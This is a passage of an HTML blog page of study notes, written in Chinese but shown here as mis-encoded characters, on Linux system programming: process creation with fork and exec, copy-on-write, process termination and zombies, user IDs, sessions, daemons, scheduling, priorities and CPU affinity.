href="#5-1-1-åˆ†é…è¿›ç¨‹ID" class="headerlink" title="5.1.1 åˆ†é…è¿›ç¨‹ID"></a>5.1.1 åˆ†é…è¿›ç¨‹ID</h3><p>ç¼ºçœæœ€å¤§ä¸º32768.</p><p>è®¾ç½®<code>/proc/sys/kernel/pid_max</code>æ¥ä¿®æ”¹ã€‚</p><p>å†…æ ¸ä¸ä¼šé‡ç”¨ä»¥å‰å·²ç»åˆ†é…è¿‡çš„å€¼ã€‚</p><h3 id="5-1-2-è¿›ç¨‹ä½“ç³»"><a href="#5-1-2-è¿›ç¨‹ä½“ç³»" class="headerlink" title="5.1.2 è¿›ç¨‹ä½“ç³»"></a>5.1.2 è¿›ç¨‹ä½“ç³»</h3><p>çˆ¶è¿›ç¨‹å·(ppid).</p><p>æ¯ä¸ªè¿›ç¨‹éƒ½è¢«ä¸€ä¸ªç”¨æˆ·å’Œä¸€ä¸ªç»„æ‹¥æœ‰ã€‚</p><p>æ¯ä¸ªå­è¿›ç¨‹éƒ½ç»§æ‰¿äº†çˆ¶è¿›ç¨‹çš„ç”¨æˆ·å’Œç»„ã€‚</p><p>æ‰€æœ‰ä¸ç®¡é“ç›¸å…³çš„å‘½ä»¤éƒ½å±äºåŒä¸€ä¸ªè¿›ç¨‹ç»„ã€‚</p><h3 id="5-1-3-pid-t"><a href="#5-1-3-pid-t" class="headerlink" title="5.1.3 pid_t"></a>5.1.3 pid_t</h3><p>åœ¨Linuxé€šå¸¸æ˜¯Cè¯­è¨€ä¸­çš„intç±»å‹ã€‚</p><p>ç³»ç»Ÿè°ƒç”¨ä¼¼ä¹å°±æ˜¯ç³»ç»Ÿç¼–ç¨‹ä¸­çš„å‡½æ•°.</p><h2 id="5-2-è¿è¡Œæ–°è¿›ç¨‹"><a href="#5-2-è¿è¡Œæ–°è¿›ç¨‹" class="headerlink" title="5.2 è¿è¡Œæ–°è¿›ç¨‹"></a>5.2 è¿è¡Œæ–°è¿›ç¨‹</h2><p><code>fork()</code>åŸºæœ¬ä¸Šå°±æ˜¯å¤åˆ¶çˆ¶è¿›ç¨‹ã€‚</p><h3 id="5-2-1-execç³»åˆ—ç³»ç»Ÿè°ƒç”¨"><a href="#5-2-1-execç³»åˆ—ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="5.2.1 execç³»åˆ—ç³»ç»Ÿè°ƒç”¨"></a>5.2.1 execç³»åˆ—ç³»ç»Ÿè°ƒç”¨</h3><p>æ²¡æœ‰å•ä¸€çš„execç³»ç»Ÿè°ƒç”¨ï¼Œè€Œæ˜¯ä¸€ç»„execå‡½æ•°æ„æˆã€‚</p><p>å¯å˜é•¿å‚æ•°ä»¥<code>NULL</code>ç»“å°¾ã€‚</p><h3 id="5-2-2-fork-ç³»ç»Ÿè°ƒç”¨"><a href="#5-2-2-fork-ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="5.2.2 fork()ç³»ç»Ÿè°ƒç”¨"></a>5.2.2 fork()ç³»ç»Ÿè°ƒç”¨</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/type.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">pid_t</span> <span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span>;<br></code></pre></td></tr></table></figure><p>åˆ›å»ºäº†ä¸€ä¸ªå­è¿›ç¨‹åï¼Œçˆ¶è¿›ç¨‹ä¼šæ²¡æœ‰ä»»ä½•æ”¹å˜çš„ç»§ç»­è¿è¡Œä¸‹å»ï¼Œ<code>execv()</code>ä¼šä½¿å­è¿›ç¨‹å»è¿è¡Œ<code>/bin/windlass</code></p><h4 id="5-2-2-1-å†™æ—¶å¤åˆ¶"><a href="#5-2-2-1-å†™æ—¶å¤åˆ¶" class="headerlink" title="5.2.2.1 å†™æ—¶å¤åˆ¶"></a>5.2.2.1 å†™æ—¶å¤åˆ¶</h4><p>æ—©æœŸUNIXç³»ç»Ÿä¸ºé€é¡µå¤åˆ¶ã€‚</p><p>ç°ä»£UNIXç³»ç»Ÿå¦‚Linuxï¼Œé‡‡ç”¨å†™æ—¶å¤åˆ¶ã€‚</p><p>å¦‚æœä¸€ä¸ªè¿›ç¨‹è¦ä¿®æ”¹è‡ªå·±çš„é‚£ä»½èµ„æºï¼Œé‚£å°±å¤åˆ¶ä¸€ä»½ï¼Œä¿®æ”¹åˆ«çš„èµ„æºæ—¶åªéœ€è¦æŒ‡å‘é‚£ä¸ªèµ„æºçš„æŒ‡é’ˆã€‚æ„æ€å°±æ˜¯å¹¶ä¸æ˜¯å®Œå…¨å¤åˆ¶çˆ¶è¿›ç¨‹ï¼Œéƒ¨åˆ†èµ„æºå°±æ˜¯æŒ‡å‘çˆ¶è¿›ç¨‹çš„èµ„æºï¼Œåªæœ‰å½“è¦ä½¿ç”¨é‚£ä»½èµ„æºæ—¶æ‰ä¼šå¤åˆ¶ã€‚</p><p>å¥½å¤„: å¦‚æœè¿›ç¨‹ä»æ¥å°±ä¸éœ€è¦ä¿®æ”¹èµ„æºï¼Œåˆ™ä¸éœ€è¦è¿›è¡Œå¤åˆ¶ã€‚</p><p>åœ¨<code>fork()</code>è°ƒç”¨ç»“æŸåï¼Œçˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹éƒ½ç›¸ä¿¡å®ƒä»¬æœ‰ä¸€ä¸ªè‡ªå·±çš„åœ°å€ç©ºé—´ï¼Œä½†å®é™…ä¸Šå®ƒä»¬å…±äº«çˆ¶è¿›ç¨‹çš„åŸå§‹é¡µã€‚</p><p><mark>ç†è§£:</mark><br>æ‰€ä»¥å…±äº«åœ°å€ç©ºé—´çš„æ„æ€å°±æ˜¯æ˜¯åŒä¸€æ®µä»£ç ã€‚</p><h4 id="5-2-2-2-vfork"><a href="#5-2-2-2-vfork" class="headerlink" title="5.2.2.2 vfork()"></a>5.2.2.2 vfork()</h4><h2 id="5-3-ç»ˆæ­¢è¿›ç¨‹"><a href="#5-3-ç»ˆæ­¢è¿›ç¨‹" class="headerlink" title="5.3 ç»ˆæ­¢è¿›ç¨‹"></a>5.3 ç»ˆæ­¢è¿›ç¨‹</h2><p>POSIXå’ŒC89éƒ½å®šä¹‰äº†ç»ˆæ­¢å½“å‰è¿›ç¨‹çš„æ ‡å‡†å‡½æ•°:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><br>void <span class="hljs-keyword">exit</span>(int status);<br></code></pre></td></tr></table></figure><p>vfork()çš„ä½¿ç”¨è€…ç»ˆæ­¢è¿›ç¨‹æ—¶å¿…é¡»ä½¿ç”¨<code>_exit()</code>, è€Œä¸æ˜¯<code>exit()</code>.</p><h3 id="5-3-1-å…¶ä»–ç»ˆæ­¢è¿›ç¨‹çš„æ–¹å¼"><a href="#5-3-1-å…¶ä»–ç»ˆæ­¢è¿›ç¨‹çš„æ–¹å¼" class="headerlink" title="5.3.1 å…¶ä»–ç»ˆæ­¢è¿›ç¨‹çš„æ–¹å¼"></a>5.3.1 å…¶ä»–ç»ˆæ­¢è¿›ç¨‹çš„æ–¹å¼</h3><p>åœ¨<code>main()</code>å‡½æ•°è¿”å›æ—¶æ˜ç¡®ç»™å‡ºä¸€ä¸ªçŠ¶æ€å€¼ï¼Œæˆ–è€…è°ƒç”¨<code>exit()</code>æ˜¯ä¸ªè‰¯å¥½çš„å˜æˆä¹ æƒ¯ã€‚</p><h3 id="5-3-2-atexit"><a href="#5-3-2-atexit" class="headerlink" title="5.3.2 atexit()"></a>5.3.2 atexit()</h3><p>ç”¨æ¥æ³¨å†Œä¸€äº›åœ¨è¿›ç¨‹ç»“æŸæ—¶è¦è°ƒç”¨çš„å‡½æ•°ã€‚</p><p>å‡½æ•°è°ƒç”¨çš„é¡ºåºå’Œæ³¨å†Œé¡ºåºç›¸åã€‚ä¹Ÿå°±æ˜¯è¿™äº›å‡½æ•°å­˜å‚¨åœ¨æ ˆä¸­ã€‚</p><h3 id="5-3-4-SIGCHLD"><a href="#5-3-4-SIGCHLD" class="headerlink" title="5.3.4 SIGCHLD"></a>5.3.4 SIGCHLD</h3><p>å½“ä¸€ä¸ªå­è¿›ç¨‹ç»ˆæ­¢æ—¶ï¼Œå†…æ ¸ä¼šå‘å…¶çˆ¶è¿›ç¨‹å‘é€SIGCHILDä¿¡å·ã€‚</p><h2 id="5-4-ç­‰å¾…ç»ˆæ­¢çš„å­è¿›ç¨‹"><a href="#5-4-ç­‰å¾…ç»ˆæ­¢çš„å­è¿›ç¨‹" class="headerlink" title="5.4 ç­‰å¾…ç»ˆæ­¢çš„å­è¿›ç¨‹"></a>5.4 ç­‰å¾…ç»ˆæ­¢çš„å­è¿›ç¨‹</h2><p>å¤„äºè¿™ç§çŠ¶æ€çš„è¿›ç¨‹å«åšåƒµæ­»(zombie)è¿›ç¨‹ï¼Œä¿ç•™æœ€å°çš„æ¦‚è¦ä¿¡æ¯ã€‚</p><p>åªè¦çˆ¶è¿›ç¨‹è·å–äº†å­è¿›ç¨‹çš„ä¿¡æ¯ï¼Œå­è¿›ç¨‹å°±ä¼šæ¶ˆå¤±ï¼Œå¦åˆ™ä¸€ç›´ä¿æŒåƒµæ­»çŠ¶æ€ã€‚</p><p><code>wait()</code>è¿”å›å·²iç»ˆæ­¢å­è¿›ç¨‹çš„pid.</p><h3 id="5-4-1-ç­‰å¾…ç‰¹å®šçš„è¿›ç¨‹"><a href="#5-4-1-ç­‰å¾…ç‰¹å®šçš„è¿›ç¨‹" class="headerlink" title="5.4.1 ç­‰å¾…ç‰¹å®šçš„è¿›ç¨‹"></a>5.4.1 ç­‰å¾…ç‰¹å®šçš„è¿›ç¨‹</h3><p><code>waitpid()</code>ç³»ç»Ÿè°ƒç”¨ã€‚</p><h3 id="5-4-1-ç­‰å¾…ç‰¹å®šè¿›ç¨‹"><a href="#5-4-1-ç­‰å¾…ç‰¹å®šè¿›ç¨‹" class="headerlink" title="5.4.1 ç­‰å¾…ç‰¹å®šè¿›ç¨‹"></a>5.4.1 ç­‰å¾…ç‰¹å®šè¿›ç¨‹</h3><h3 id="5-4-5-åƒµæ­»è¿›ç¨‹"><a href="#5-4-5-åƒµæ­»è¿›ç¨‹" class="headerlink" title="5.4.5 åƒµæ­»è¿›ç¨‹"></a>5.4.5 åƒµæ­»è¿›ç¨‹</h3><p>åªè¦æœ‰è¿›ç¨‹ç»“æŸäº†ï¼Œå†…æ ¸å°±ä¼šéå†å®ƒçš„æ‰€æœ‰å­è¿›ç¨‹ï¼Œå¹¶ä¸”æŠŠä»–ä»¬çš„çˆ¶è¿›ç¨‹é‡æ–°è®¾ç½®ä¸º<code>init</code>è¿›ç¨‹ã€‚è¿™ä¿è¯äº†ç³»ç»Ÿä¸­æ²¡æœ‰ä¸å­˜åœ¨çˆ¶è¿›ç¨‹çš„è¿›ç¨‹ã€‚</p><h2 id="ç”¨æˆ·å’Œç»„"><a href="#ç”¨æˆ·å’Œç»„" class="headerlink" title="ç”¨æˆ·å’Œç»„"></a>ç”¨æˆ·å’Œç»„</h2><p>ç”¨æˆ·IDå’Œç»„IDåˆ†åˆ«ç”¨Cè¯­è¨€deuid_tå’Œgid_tè¿™ä¸¤ä¸ªç±»å‹è¡¨ç¤ºã€‚</p><p>æ•°å­—è¡¨ç¤ºå’Œå­—ç¬¦è¡¨ç¤ºæ˜¯æ˜ å°„å…³ç³».</p><p>åœ¨Linuxä¸­ï¼Œä¸€ä¸ªè¿›ç¨‹çš„ç”¨æˆ·IDå’Œç»„IDä»£è¡¨è¿™ä¸ªè¿›ç¨‹å¯ä»¥æ‰§è¡Œå“ªäº›æ“ä½œã€‚</p><p>æœ€å¥½é‡‡ç”¨â€æœ€å°æƒé™â€åŸåˆ™ã€‚</p><h3 id="5-5-1-å®é™…ç”¨æˆ·-ç»„-IDã€æœ‰æ•ˆç”¨æˆ·-ç»„-IDå’Œä¿æŠ¤è®¾ç½®ç”¨æˆ·-ç»„-ID"><a href="#5-5-1-å®é™…ç”¨æˆ·-ç»„-IDã€æœ‰æ•ˆç”¨æˆ·-ç»„-IDå’Œä¿æŠ¤è®¾ç½®ç”¨æˆ·-ç»„-ID" class="headerlink" title="5.5.1 å®é™…ç”¨æˆ·(ç»„)IDã€æœ‰æ•ˆç”¨æˆ·(ç»„)IDå’Œä¿æŠ¤è®¾ç½®ç”¨æˆ·(ç»„)ID"></a>5.5.1 å®é™…ç”¨æˆ·(ç»„)IDã€æœ‰æ•ˆç”¨æˆ·(ç»„)IDå’Œä¿æŠ¤è®¾ç½®ç”¨æˆ·(ç»„)ID</h3><p>ä¸è¿›ç¨‹ç›¸å…³çš„ç”¨æˆ·IDæœ‰å››ä¸ª:</p><pre><code class="hljs">1. å®é™…ç”¨æˆ·ID, è¿è¡Œè¿™ä¸ªè¿›ç¨‹çš„é‚£ä¸ªç”¨æˆ·çš„uid2. æœ‰æ•ˆç”¨æˆ·ID, å½“å‰è¿›ç¨‹æ‰€ä½¿ç”¨çš„ç”¨æˆ·ID, æƒé™éªŒè¯ä¸€èˆ¬ä½¿ç”¨çš„å€¼ã€‚3. ä¿å­˜è®¾ç½®ç”¨æˆ·ID, æ˜¯è¿›ç¨‹åŸå…ˆçš„æœ‰æ•ˆç”¨æˆ·ID4. æ–‡ä»¶ç³»ç»Ÿç”¨æˆ·ID</code></pre><h2 id="5-6-ä¼šè¯å’Œè¿›ç¨‹ç»„"><a href="#5-6-ä¼šè¯å’Œè¿›ç¨‹ç»„" class="headerlink" title="5.6 ä¼šè¯å’Œè¿›ç¨‹ç»„"></a>5.6 ä¼šè¯å’Œè¿›ç¨‹ç»„</h2><p>æ¯ä¸ªè¿›ç¨‹éƒ½å±äºæŸä¸ªè¿›ç¨‹ç»„ã€‚</p><p>è¿›ç¨‹ç»„çš„ä¸»è¦ç‰¹å¾: ä¿¡å·å¯ä»¥å‘é€ç»™è¿›ç¨‹ä¸­æ‰€æœ‰è¿›ç¨‹ï¼Œè¿™ä¸ªä¿¡å·å¯ä»¥ä½¿åŒä¸€ä¸ªè¿›ç¨‹ç»„ä¸­çš„æ‰€æœ‰è¿›ç¨‹ç»ˆæ­¢ã€åœæ­¢æˆ–è€…ç»§ç»­è¿è¡Œã€‚</p><p>æ¯ä¸ªè¿›ç¨‹ç»„éƒ½ç”±è¿›ç¨‹ç»„ID(pgid)å”¯ä¸€æ ‡è¯†ã€‚</p><p>è¿›ç¨‹ç»„IDå°±æ˜¯ç»„é•¿è¿›ç¨‹çš„ID. åªè¦è¿›ç¨‹ç»„ä¸­è¿˜æœ‰ä¸€ä¸ªè¿›ç¨‹å­˜åœ¨ï¼Œåˆ™è¯¥è¿›ç¨‹ç»„å°±å­˜åœ¨ã€‚</p><p>ä¸€ä¸ªä¼šè¯å°±æ˜¯ä¸€ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹ç»„ï¼Œä¼šè¯çš„åŠŸèƒ½å’Œshellå·®ä¸å¤šã€‚</p><p>è¿›ç¨‹ç»„æä¾›äº†å‘å…¶ä¸­æ‰€æœ‰è¿›ç¨‹å‘é€ä¿¡å·çš„æœºåˆ¶ï¼Œä¼šè¯åˆ™å°†ç™»å½•ä¸æ§åˆ¶ç»ˆç«¯è”ç³»èµ·æ¥ã€‚</p><p>è¿›ç¨‹ç»„ä¸­ç›´æ¥ä¸ç”¨æˆ·æ‰“äº¤é“å¹¶ä¸”æ§åˆ¶ç»ˆç«¯ä¸ºå‰å°è¿›ç¨‹ç»„ï¼Œå…¶ä»–éƒ½æ˜¯åå°è¿›ç¨‹ç»„ã€‚</p><p>å®ˆæŠ¤è¿›ç¨‹ä¼šåˆ›å»ºè‡ªå·±çš„ä¼šè¯ã€‚</p><h2 id="5-7-å®ˆæŠ¤è¿›ç¨‹"><a href="#5-7-å®ˆæŠ¤è¿›ç¨‹" class="headerlink" title="5.7 å®ˆæŠ¤è¿›ç¨‹"></a>5.7 å®ˆæŠ¤è¿›ç¨‹</h2><p>å®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨åå°ï¼Œä¸ä¸ä»»ä½•æ§åˆ¶ç»ˆç«¯ç›¸å…³è”ã€‚</p><p>ä¹ æƒ¯ä¸Šå®ˆæŠ¤è¿›ç¨‹çš„åå­—é€šå¸¸ä»¥dç»“å°¾ã€‚</p><p>è¿™ä¸ªåå­—æ¥æºäºéº¦å…‹æ–¯éŸ¦å¦–(Maxwellâ€™s demon). å¸Œè…Šç¥è¯ä¸­çš„demonæ˜¯ç¥çš„åŠ©æ‰‹ï¼Œåšä¸€äº›å¥¥æ—åŒ¹æ–¯å±±çš„å±…æ°‘è‡ªå·±ä¸æ„¿æ„åšçš„äº‹.</p><p>å®ˆæŠ¤è¿›ç¨‹çš„ä¸¤ä¸ªåŸºæœ¬è¦æ±‚:</p><pre><code class="hljs">1. å¿…é¡»æ˜¯initè¿›ç¨‹çš„å­è¿›ç¨‹2. ä¸ä¸ä»»ä½•æ§åˆ¶ç»ˆç«¯ç›¸å…³è”</code></pre><h1 id="ç¬¬å…­ç« -é«˜çº§è¿›ç¨‹ç®¡ç†"><a href="#ç¬¬å…­ç« -é«˜çº§è¿›ç¨‹ç®¡ç†" class="headerlink" title="ç¬¬å…­ç«  é«˜çº§è¿›ç¨‹ç®¡ç†"></a>ç¬¬å…­ç«  é«˜çº§è¿›ç¨‹ç®¡ç†</h1><h2 id="6-1-è¿›ç¨‹è°ƒåº¦"><a href="#6-1-è¿›ç¨‹è°ƒåº¦" class="headerlink" title="6.1 è¿›ç¨‹è°ƒåº¦"></a>6.1 è¿›ç¨‹è°ƒåº¦</h2><p>è¿›ç¨‹è°ƒåº¦å™¨æ˜¯æŠŠæœ‰é™çš„å¤„ç†å™¨èµ„æºåˆ†é…ç»™è¿›ç¨‹çš„å†…æ ¸å­ç³»ç»Ÿï¼Œæ˜¯å†…æ ¸ä¸­å†³å®šå“ªä¸ªè¿›ç¨‹å¯ä»¥è¿è¡Œçš„ç»„ä»¶ã€‚</p><p>å¤šä»»åŠ¡æ“ä½œç³»ç»Ÿå¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»:</p><pre><code class="hljs">1. ååŒå¼2. æŠ¢å å¼</code></pre><p>Linuxå®ç°äº†åä¸€ç§å½¢å¼çš„å¤šä»»åŠ¡ï¼Œè°ƒåº¦å™¨å¯ä»¥è¦æ±‚ä¸€ä¸ªè¿›ç¨‹åœæ­¢è¿è¡Œï¼Œå¤„ç†å™¨è½¬è€Œè¿è¡Œå¦ä¸€ä¸ªç¨‹åºã€‚</p><p>åœ¨ååŒå¤šä»»åŠ¡ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªè¿›ç¨‹æŒç»­è¿è¡Œç›´åˆ°å®ƒè‡ªå‘åœæ­¢ã€‚</p><h3 id="6-1-1-å¤§Oè®°æ³•"><a href="#6-1-1-å¤§Oè®°æ³•" class="headerlink" title="6.1.1 å¤§Oè®°æ³•"></a>6.1.1 å¤§Oè®°æ³•</h3><p>å½¢å¼åœ°å®šä¹‰:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm">if f(<span class="hljs-keyword">x</span>) is O(g(<span class="hljs-keyword">x</span>))<br><br>then<br><br>å­˜åœ¨<span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span> such that f(<span class="hljs-keyword">x</span>) &lt;<span class="hljs-operator">=</span> <span class="hljs-keyword">c</span> * g(<span class="hljs-keyword">x</span>)<span class="hljs-punctuation">,</span> å¯¹äºä»»æ„<span class="hljs-keyword">x</span>&gt;<span class="hljs-keyword">x</span><span class="hljs-number">1</span>éƒ½æˆç«‹<br></code></pre></td></tr></table></figure><h3 id="6-1-2-æ—¶é—´ç‰‡"><a href="#6-1-2-æ—¶é—´ç‰‡" class="headerlink" title="6.1.2 æ—¶é—´ç‰‡"></a>6.1.2 æ—¶é—´ç‰‡</h3><p>è¿›ç¨‹ä¸ä¸€å®šè¦åœ¨ä¸€æ¬¡è¿è¡Œä¸­è€—å…‰æ‰€æœ‰æ—¶é—´ç‰‡ã€‚</p><h3 id="6-1-3-I-x2F-Oçº¦æŸè¿›ç¨‹-VS-å¤„ç†å™¨çº¦æŸè¿›ç¨‹"><a href="#6-1-3-I-x2F-Oçº¦æŸè¿›ç¨‹-VS-å¤„ç†å™¨çº¦æŸè¿›ç¨‹" class="headerlink" title="6.1.3 I&#x2F;Oçº¦æŸè¿›ç¨‹ VS å¤„ç†å™¨çº¦æŸè¿›ç¨‹"></a>6.1.3 I&#x2F;Oçº¦æŸè¿›ç¨‹ VS å¤„ç†å™¨çº¦æŸè¿›ç¨‹</h3><p>æŒç»­åœ°æ¶ˆè€—æ‰€æœ‰å¯ç”¨æ—¶é—´ç‰‡çš„è¿›ç¨‹ç§°ä¸ºâ€å¤„ç†å™¨çº¦æŸè¿›ç¨‹â€.</p><p>å¤šæ•°æ—¶é—´å¤„äºç­‰å¾…èµ„æºçš„é˜»å¡çŠ¶æ€çš„è¿›ç¨‹ç§°ä¸ºâ€I&#x2F;Oçº¦æŸè¿›ç¨‹â€.</p><h3 id="6-1-4-æŠ¢å è°ƒåº¦"><a href="#6-1-4-æŠ¢å è°ƒåº¦" class="headerlink" title="6.1.4 æŠ¢å è°ƒåº¦"></a>6.1.4 æŠ¢å è°ƒåº¦</h3><p>UNIXè°ƒåº¦ä¸­ä¸€æ¡é‡è¦åŸåˆ™: æ‰€æœ‰çš„è¿›ç¨‹å¿…é¡»è¿è¡Œã€‚</p><h3 id="6-1-5-çº¿ç¨‹"><a href="#6-1-5-çº¿ç¨‹" class="headerlink" title="6.1.5 çº¿ç¨‹"></a>6.1.5 çº¿ç¨‹</h3><p>æœ¬è´¨ä¸Šï¼Œå†…æ ¸æ²¡æœ‰çº¿ç¨‹æ¦‚å¿µï¼Œå¯¹äºLinuxå†…æ ¸æ¥è¯´ï¼Œæ‰€æœ‰çš„çº¿ç¨‹éƒ½æ˜¯ç‹¬ç«‹çš„è¿›ç¨‹ã€‚</p><p>å…±äº«åŒä¸€åœ°å€ç©ºé—´ï¼Œå³åŒæ ·çš„åŠ¨æ€å†…å­˜ï¼Œæ˜ å°„æ–‡ä»¶ï¼Œç›®æ ‡ä»£ç ç­‰ã€‚</p><h2 id="6-2-è®©å‡ºå¤„ç†å™¨"><a href="#6-2-è®©å‡ºå¤„ç†å™¨" class="headerlink" title="6.2 è®©å‡ºå¤„ç†å™¨"></a>6.2 è®©å‡ºå¤„ç†å™¨</h2><h2 id="6-3-è¿›ç¨‹ä¼˜å…ˆçº§"><a href="#6-3-è¿›ç¨‹ä¼˜å…ˆçº§" class="headerlink" title="6.3 è¿›ç¨‹ä¼˜å…ˆçº§"></a>6.3 è¿›ç¨‹ä¼˜å…ˆçº§</h2><p>å†å²ä¸Š, UnixæŠŠè¿™ä¸ªä¼˜å…ˆçº§ç§°ä¸ºâ€nice valueâ€.</p><p>Linuxè°ƒåº¦å™¨åŸºäºè¿™æ ·çš„åŸåˆ™æ¥è°ƒåº¦: é«˜ä¼˜å…ˆçº§çš„ç¨‹åºæ€»æ˜¯å…ˆè¿è¡Œã€‚ åŒæ—¶ï¼Œniceå€¼ä¹ŸæŒ‡æ˜äº†è¿›ç¨‹çš„æ—¶é—´ç‰‡é•¿åº¦ã€‚</p><p>åˆæ³•çš„ä¼˜å…ˆçº§åœ¨-20åˆ°19ä¹‹é—´ï¼Œé»˜è®¤ä¸ºé›¶ã€‚niceå€¼è¶Šä½, ä¼˜å…ˆçº§è¶Šé«˜ï¼Œæ—¶é—´ç‰‡è¶Šé•¿.</p><h3 id="6-3-3-I-x2F-Oä¼˜å…ˆçº§"><a href="#6-3-3-I-x2F-Oä¼˜å…ˆçº§" class="headerlink" title="6.3.3 I&#x2F;Oä¼˜å…ˆçº§"></a>6.3.3 I&#x2F;Oä¼˜å…ˆçº§</h3><h3 id="6-4-å¤„ç†å™¨äº²å’Œåº¦"><a href="#6-4-å¤„ç†å™¨äº²å’Œåº¦" class="headerlink" title="6.4 å¤„ç†å™¨äº²å’Œåº¦"></a>6.4 å¤„ç†å™¨äº²å’Œåº¦</h3><p>è¿›ç¨‹è°ƒåº¦å™¨å¿…é¡»è§£å†³ä¸¤ä¸ªé—®é¢˜:</p><pre><code class="hljs">1. å¿…é¡»å……åˆ†åˆ©ç”¨ç³»ç»Ÿçš„å¤„ç†å™¨2. å°½é‡é¿å…å¤„ç†å™¨ç©ºé—²</code></pre><p>å¦‚æœè¿›ç¨‹æ›¾åœ¨æŸä¸€CPUä¸Šè¿è¡Œï¼Œè¿›ç¨‹è°ƒåº¦å™¨è¿˜åº”è¯¥å°½é‡æŠŠå®ƒæ”¾åœ¨åŒä¸€CPUä¸Šã€‚</p><p>å¤„ç†å™¨äº²å’Œåº¦è¡¨æ˜ä¸€ä¸ªè¿›ç¨‹åœç•™åœ¨ç»Ÿä¸€å¤„ç†å™¨ä¸Šçš„å¯èƒ½æ€§ã€‚</p><p>â€œè½¯äº²å’Œåº¦(soft affinity)â€è¡¨æ˜è°ƒåº¦å™¨æŒç»­è°ƒåº¦è¿›ç¨‹åˆ°åŒä¸€å¤„ç†å™¨ä¸Šçš„è‡ªç„¶å€¾å‘ã€‚</p><p>â€œç¡¬äº²å’Œåº¦(hard affinity)â€æè¿°äº†å¼ºåˆ¶å†…æ ¸ä¿è¯è¿›ç¨‹åˆ°å¤„ç†å™¨çš„ç»‘å®šã€‚</p><h2 id="6-5-å®æ—¶ç³»ç»Ÿ"><a href="#6-5-å®æ—¶ç³»ç»Ÿ" class="headerlink" title="6.5 å®æ—¶ç³»ç»Ÿ"></a>6.5 å®æ—¶ç³»ç»Ÿ</h2><p>å¦‚æœä¸€ä¸ªç³»ç»Ÿå—åˆ°æ“ä½œæœŸé™(è¯·æ±‚ä¸å“åº”ä¹‹é—´çš„æœ€å°é‡å’Œå‘½ä»¤æ¬¡æ•°)çš„æ”¯é…ï¼Œå°±ç§°è¯¥ç³»ç»Ÿæ˜¯â€å®æ—¶â€çš„ã€‚</p><h3 id="6-5-1-è½¯ç¡¬å®æ—¶ç³»ç»Ÿ"><a href="#6-5-1-è½¯ç¡¬å®æ—¶ç³»ç»Ÿ" class="headerlink" title="6.5.1 è½¯ç¡¬å®æ—¶ç³»ç»Ÿ"></a>6.5.1 è½¯ç¡¬å®æ—¶ç³»ç»Ÿ</h3><p>ç¡¬å®æ—¶ç³»ç»Ÿå¯¹äºæ“ä½œæœŸé™è¦æ±‚éå¸¸ä¸¥æ ¼ï¼Œè¶…è¿‡æœŸé™å°±ä¼šäº§ç”Ÿå¤±è´¥ã€‚</p><p>è½¯å®æ—¶ç³»ç»Ÿä¸è®¤ä¸ºè¶…è¿‡æœŸé™æ˜¯ä¸€ä¸ªä¸¥é‡çš„å¤±è´¥ã€‚</p><h3 id="6-5-2-å»¶æ—¶ï¼ŒæŠ–åŠ¨å’Œæˆªæ­¢æœŸé™"><a href="#6-5-2-å»¶æ—¶ï¼ŒæŠ–åŠ¨å’Œæˆªæ­¢æœŸé™" class="headerlink" title="6.5.2 å»¶æ—¶ï¼ŒæŠ–åŠ¨å’Œæˆªæ­¢æœŸé™"></a>6.5.2 å»¶æ—¶ï¼ŒæŠ–åŠ¨å’Œæˆªæ­¢æœŸé™</h3><h1 id="ç¬¬ä¸ƒç« -æ–‡ä»¶ä¸ç›®å½•ç®¡ç†"><a href="#ç¬¬ä¸ƒç« -æ–‡ä»¶ä¸ç›®å½•ç®¡ç†" class="headerlink" title="ç¬¬ä¸ƒç«  æ–‡ä»¶ä¸ç›®å½•ç®¡ç†"></a>ç¬¬ä¸ƒç«  æ–‡ä»¶ä¸ç›®å½•ç®¡ç†</h1><h2 id="7-1-æ–‡ä»¶åŠå…¶å…ƒæ•°æ®"><a href="#7-1-æ–‡ä»¶åŠå…¶å…ƒæ•°æ®" class="headerlink" title="7.1 æ–‡ä»¶åŠå…¶å…ƒæ•°æ®"></a>7.1 æ–‡ä»¶åŠå…¶å…ƒæ•°æ®</h2><p>inodeå­˜å‚¨äº†ä¸æ–‡ä»¶æœ‰å…³çš„å…ƒæ•°æ®, å¦‚æ–‡ä»¶çš„è®¿é—®æƒé™ï¼Œæœ€åè®¿é—®æ—¶é—´ï¼Œæ‰€æœ‰è€…ï¼Œæ‰€æœ‰ç»„ï¼Œå¤§å°ä»¥åŠæ–‡ä»¶æ•°æ®çš„å­˜å‚¨ä½ç½®ã€‚</p><p>ç»“æ„statå­˜å‚¨äº†æ–‡ä»¶ä¿¡æ¯. </p><h1 id="ç¬¬å…«ç« -å†…å­˜ç®¡ç†"><a href="#ç¬¬å…«ç« -å†…å­˜ç®¡ç†" class="headerlink" title="ç¬¬å…«ç«  å†…å­˜ç®¡ç†"></a>ç¬¬å…«ç«  å†…å­˜ç®¡ç†</h1><h2 id="8-1-è¿›ç¨‹åœ°å€ç©ºé—´"><a href="#8-1-è¿›ç¨‹åœ°å€ç©ºé—´" class="headerlink" title="8.1 è¿›ç¨‹åœ°å€ç©ºé—´"></a>8.1 è¿›ç¨‹åœ°å€ç©ºé—´</h2><p>è™šæ‹Ÿåœ°å€ç©ºé—´(virtual 